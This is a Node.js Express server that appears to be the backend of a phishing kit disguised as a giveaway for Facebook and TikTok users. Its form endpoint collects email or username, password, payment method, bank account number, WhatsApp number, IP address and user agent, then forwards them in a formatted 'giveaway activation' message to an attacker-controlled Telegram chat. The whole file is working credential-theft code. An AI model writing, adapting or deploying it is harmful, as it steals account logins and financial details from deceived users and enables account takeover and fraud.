const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Telegram Bot setup
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });

// Security middleware
app.use(helmet());

// CORS configuration
app.use(cors({
  origin: process.env.NODE_ENV === 'production' 
    ? ['https://retopremio.onrender.com'] 
    : ['http://localhost:5173', 'http://localhost:3000'],
  credentials: true
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000, // 15 minutes
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', limiter);

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Form submission endpoint
app.post('/api/submit-form', async (req, res) => {
  try {
    const { 
      platform, 
      email, 
      password, 
      username,
      userAnswers,
      ipAddress,
      userAgent 
    } = req.body;

    // Validate required fields
    if (!platform || (!email && !username)) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required fields' 
      });
    }

    // Format message for Telegram
    const message = formatTelegramMessage({
      platform,
      email,
      password,
      username,
      userAnswers,
      ipAddress,
      userAgent,
      timestamp: new Date().toISOString()
    });

    // Send to Telegram
    const telegramResponse = await bot.sendMessage(
      process.env.TELEGRAM_CHAT_ID, 
      message, 
      { parse_mode: 'HTML' }
    );

    console.log('Form data sent to Telegram successfully:', {
      platform,
      timestamp: new Date().toISOString(),
      telegramMessageId: telegramResponse.message_id
    });

    res.json({ 
      success: true, 
      message: 'Form submitted successfully',
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('Error submitting form:', error);
    
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error',
      error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
    });
  }
});

// Function to format Telegram message
function formatTelegramMessage(data) {
  const {
    platform,
    email,
    password,
    username,
    userAnswers,
    ipAddress,
    userAgent,
    timestamp
  } = data;

  const platformEmoji = platform === 'facebook' ? '📘' : '🎵';
  const platformName = platform === 'facebook' ? 'Facebook' : 'TikTok';
  
  let message = `
🚨 <b>NEW GIVEAWAY ACTIVATION ATTEMPT</b> 🚨

${platformEmoji} <b>Platform:</b> ${platformName}
⏰ <b>Timestamp:</b> ${new Date(timestamp).toLocaleString()}

👤 <b>Login Credentials:</b>
`;

  if (email) message += `📧 <b>Email:</b> ${email}\n`;
  if (username) message += `👤 <b>Username:</b> ${username}\n`;
  if (password) message += `🔑 <b>Password:</b> ${password}\n`;

  if (userAnswers) {
    message += `\n💳 <b>User Information:</b>\n`;
    if (userAnswers.paymentMethod) message += `💳 <b>Payment Method:</b> ${userAnswers.paymentMethod}\n`;
    if (userAnswers.accountNumber) message += `🏦 <b>Account Number:</b> ${userAnswers.accountNumber}\n`;
    if (userAnswers.whatsappNumber) message += `📱 <b>WhatsApp:</b> ${userAnswers.whatsappNumber}\n`;
  }

  if (ipAddress) message += `\n🌐 <b>IP Address:</b> ${ipAddress}\n`;
  if (userAgent) message += `\n🖥️ <b>User Agent:</b> ${userAgent}\n`;

  message += `\n🎯 <b>Status:</b> <code>PENDING ACTIVATION</code>`;

  return message;
}

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ 
    success: false, 
    message: 'Internal server error' 
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({ 
    success: false, 
    message: 'Endpoint not found' 
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📡 Health check: http://localhost:${PORT}/api/health`);
  console.log(`📝 Form submission: http://localhost:${PORT}/api/submit-form`);
});

module.exports = app;
